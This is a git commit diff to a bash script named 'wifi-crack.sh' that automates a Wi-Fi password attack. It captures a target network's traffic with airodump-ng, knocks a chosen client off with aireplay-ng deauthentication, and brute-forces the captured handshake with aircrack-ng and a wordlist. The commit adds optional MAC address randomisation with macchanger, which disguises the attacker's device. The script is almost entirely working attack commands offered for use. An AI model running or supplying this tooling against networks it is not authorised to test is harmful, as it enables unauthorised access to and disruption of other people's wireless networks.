5f2e85771332b3c7954ddbe0cc031ef72f5b99dc
Arti Karahoda <arti.kh@protonmail.ch>
2018-07-26 04:59:21 +0200

    Added macchanger

--- wifi-crack.sh
+++ wifi-crack.sh
@@ -20,7 +20,7 @@ esac
 done
 
 if [[ $interface = *"mon"* ]]; then
-        echo -e "${GREEN}[*]${NC} Monitoring interface detected. Stopping wlan0mon..."
+        echo -e "${GREEN}[*]${NC} Monitoring interface detected. Stopping $interface..."
         airmon-ng stop $interface > /dev/null 2>&1
         echo -e "${GREEN}[*]${NC} Restarting network manager service..."
         service network-manager restart > /dev/null 2>&1
@@ -41,7 +41,7 @@ do
 if [[ $input =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]]; then
      isbssid=1
      bssid=$input
-else
+elif [[ ! -z "$input" ]]; then
      bssid=$(nmcli -f SSID,BSSID,ACTIVE,RATE,BARS,SECURITY dev wifi list | grep -i $input | xargs | cut -d " " -f 2)
 fi
 
@@ -53,6 +53,19 @@ else
 	break
 fi
 done
+
+echo -n -e "${GREEN}[!]${NC} Would you like to change the MAC address of $interface? (y/N): "
+read macchange
+
+macinit=$(ifconfig | grep $interface -A 8 | grep ether | xargs | cut -d " " -f 2)
+
+if [[ $macchange = "y" ]]; then
+	ifconfig $interface down
+	macchanger -r $interface > /dev/null 2>&1
+	ifconfig $interface up
+	macnew=$(ifconfig | grep $interface -A 8 | grep ether | xargs | cut -d " " -f 2)
+	echo -e "${GREEN}[*]${NC} Successfully changed MAC address from $macinit to $macnew"
+fi
 
 ch=$(nmcli -f SSID,BSSID,CHAN dev wifi list | grep $bssid | xargs | cut -d " " -f 3)
 
@@ -67,7 +80,7 @@ if [ ! -d "output" ]; then
 else
 	rm -f output/*
 fi
-gnome-terminal --tab -e 'sh -c "airodump-ng --bssid \$(cat .args.txt | cut -d \" \" -f 1) --channel \$(cat .args.txt | cut -d \" \" -f 2) --write output/output \$(cat .args.txt | cut -d \" \" -f 3); exec bash"' &> /dev/null
+gnome-terminal -e 'sh -c "airodump-ng --bssid \$(cat .args.txt | cut -d \" \" -f 1) --channel \$(cat .args.txt | cut -d \" \" -f 2) --write output/output \$(cat .args.txt | cut -d \" \" -f 3); exec bash"' &> /dev/null
 echo -n -e "${GREEN}[!]${NC} Enter a client BSSID you wish to deauthenticate: "
 read client
 while true;
@@ -85,5 +98,9 @@ echo -e "${GREEN}[*]${NC} Deauthenticating $client..."
 aireplay-ng -0 1 -a $bssid -c $client $monint > /dev/null 2>&1
 read -p $'\e[32m[*]\e[0m Press ENTER when ready to brute force. The more beacons, the better signal quality...'
 echo -e "${GREEN}[*]${NC} Starting attack..."
+echo "$wordlist $bssid" > .args.txt
+#gnome-terminal -e 'sh -c "aircrack-ng -w \$(cat .args.txt | cut -d \" \" -f 1) -b \$(cat .args.txt | cut -d \" \" -f 2) output/output*.cap; exec bash"' &> /dev/null
+#aircrack-ng -w $wordlist -b $bssid output/output*.cap
+xterm -hold -fa 'Monospace' -fs 14 -e "aircrack-ng -w \$(cat .args.txt | cut -d \" \" -f 1) -b \$(cat .args.txt | cut -d \" \" -f 2) output/output*.cap" &> /dev/null
 rm .args.txt
-aircrack-ng -w $wordlist -b $bssid output/output*.cap
+echo -e "${GREEN}[*]${NC} Program terminated"
